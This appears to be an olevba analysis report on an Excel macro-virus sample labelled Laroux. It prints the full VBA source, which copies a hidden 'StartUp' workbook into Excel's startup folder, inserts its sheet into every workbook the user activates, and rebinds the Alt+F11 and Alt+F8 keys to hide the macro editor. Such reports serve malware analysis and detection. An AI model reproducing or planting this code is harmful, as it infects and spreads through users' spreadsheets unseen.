olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-58d2c9e450ab2265b2ab5ab0eb161cfb50099c92
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ▓▌╩╨╗¿╘░░▓╓├╨í╟°┴┘╩▒╣²╢╔┼⌐╛▀┼∩╣ñ│╠┐╪╓╞╝█/▓▌╩╨╗¿╘░░▓╓├╨í╟°┴┘╩▒╣²╢╔┼⌐╛▀┼∩╣ñ│╠┬Ñ┐╪╓╞╝█.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
+----------+--------------------+---------------------------------------------+

